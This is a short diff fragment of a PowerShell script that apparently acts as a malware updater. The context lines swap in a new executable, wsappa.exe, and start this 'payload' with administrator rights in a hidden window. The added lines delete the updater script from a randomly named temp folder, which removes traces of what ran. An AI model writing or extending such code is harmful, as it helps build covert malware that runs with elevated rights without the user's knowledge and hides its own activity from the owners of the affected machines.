@@ -12,3 +12,6 @@ rename-item new_wsappa.exe wsappa.exe
 
 #start new payload
 Start-Process -FilePath "wsappa.exe" -Verb RunAs -WindowStyle Hidden
+
+#clean uo
+powershell.exe /c Remove-Item $env:temp/sVBXKuz/updater.ps1
